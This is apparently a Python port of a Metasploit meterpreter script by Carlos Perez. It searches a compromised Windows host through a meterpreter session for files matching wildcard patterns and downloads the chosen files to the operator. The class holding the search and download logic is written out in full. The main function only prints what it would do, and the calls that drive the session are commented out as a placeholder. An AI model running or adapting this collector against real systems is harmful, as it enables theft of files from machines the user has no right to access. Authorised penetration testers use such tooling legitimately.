#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
If you'd like to improve this script, please try to port it as a post
module instead. Thank you.

Meterpreter Script for searching and downloading files that match a specific pattern.
First save files to a file, edit and use that same file to download the chosen files.

Author: Carlos Perez at carlos_perez[at]darkoperator.com

This is a Python translation of the Ruby meterpreter script.
"""

import argparse
import os
import sys


class FileCollector:
    """Search and collect files from target system"""
    
    def __init__(self, client):
        """
        Initialize the file collector
        
        Args:
            client: Meterpreter client session object
        """
        self.client = client
    
    def print_status(self, msg):
        """Print status message"""
        print(f"[*] {msg}")
    
    def print_error(self, msg):
        """Print error message"""
        print(f"[-] {msg}")
    
    def print_line(self, msg):
        """Print message"""
        print(msg)
    
    def search_files(self, location, search_blobs, output_file, recurse):
        """
        Search for files matching patterns
        
        Args:
            location: Directory to start search
            search_blobs: List of search patterns
            output_file: File to save results to
            recurse: Whether to search subdirectories
        """
        for search_pattern in search_blobs:
            self.print_status(f"Searching for {search_pattern}")
            
            try:
                # Search for files
                results = self.client.fs.file.search(location, search_pattern, recurse)
                
                for file_info in results:
                    file_path = f"{file_info['path']}\\{file_info['name']}"
                    file_size = file_info['size']
                    self.print_status(f"\t{file_path} ({file_size} bytes)")
                    
                    # Save to output file if specified
                    if output_file:
                        self._write_to_file(output_file, file_path)
            
            except Exception as e:
                self.print_error(f"Error searching for {search_pattern}: {e}")
    
    def download_files(self, input_file, logs_dir):
        """
        Download files listed in input file
        
        Args:
            input_file: File containing list of files to download (one per line)
            logs_dir: Directory to save downloaded files
        """
        if not os.path.exists(input_file):
            self.print_error(f"File {input_file} does not exist!")
            return
        
        self.print_status(f"Reading file {input_file}")
        self.print_status(f"Downloading to {logs_dir}")
        
        try:
            with open(input_file, 'r') as f:
                for line in f:
                    file_path = line.strip()
                    if file_path:
                        try:
                            self.print_status(f"\tDownloading {file_path}")
                            self.client.fs.file.download(logs_dir, file_path)
                        except Exception as e:
                            self.print_error(f"Error downloading {file_path}: {e}")
        
        except Exception as e:
            self.print_error(f"Error reading {input_file}: {e}")
    
    def _write_to_file(self, filename, content):
        """
        Append content to file
        
        Args:
            filename: File to write to
            content: Content to append
        """
        try:
            with open(filename, 'a') as f:
                f.write(content + '\n')
        except Exception as e:
            self.print_error(f"Error writing to {filename}: {e}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='Meterpreter Script for searching and downloading files that match a specific pattern',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Search for *.doc files in C:\\Users:
    python3 file_collector.py -d C:\\Users -f "*.doc" -r -o found_files.txt
  
  Search for multiple patterns:
    python3 file_collector.py -d C:\\Data -f "*.pdf|*.docx|*.xlsx" -o results.txt
  
  Download files from list:
    python3 file_collector.py -i found_files.txt -l ./downloads
        """
    )
    
    parser.add_argument('-i', '--input-file', type=str,
                        help='Input file with list of files to download, one per line')
    parser.add_argument('-d', '--directory', type=str,
                        help='Directory to start search on, search will be recursive if -r is used')
    parser.add_argument('-f', '--filter', type=str,
                        help='Search blobs separated by a | (e.g., "*.txt|*.doc")')
    parser.add_argument('-o', '--output', type=str,
                        help='Output File to save the full path of files found')
    parser.add_argument('-r', '--recurse', action='store_true',
                        help='Search subdirectories')
    parser.add_argument('-l', '--location', type=str,
                        help='Location where to save the downloaded files')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not any([args.input_file, args.directory]):
        parser.print_help()
        return 1
    
    # NOTE: In actual use, this would get the client from the framework
    print("NOTE: This is a translated script that requires meterpreter framework integration")
    
    if args.directory and args.filter:
        print(f"[*] Would search in: {args.directory}")
        print(f"[*] Search patterns: {args.filter}")
        print(f"[*] Recurse: {'Yes' if args.recurse else 'No'}")
        if args.output:
            print(f"[*] Save results to: {args.output}")
    
    if args.input_file and args.location:
        print(f"[*] Would download files listed in: {args.input_file}")
        print(f"[*] Save to: {args.location}")
    
    # Placeholder for actual implementation
    # client = get_meterpreter_client()
    # 
    # if client.platform != 'windows':
    #     print("[-] This version of Meterpreter is not supported with this Script!")
    #     return 1
    # 
    # collector = FileCollector(client)
    # 
    # # Search for files and save their location if specified
    # if args.directory and args.filter:
    #     search_blobs = args.filter.split('|')
    #     collector.search_files(args.directory, search_blobs, args.output, args.recurse)
    # 
    # # Download files from list
    # if args.input_file and args.location:
    #     collector.download_files(args.input_file, args.location)
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
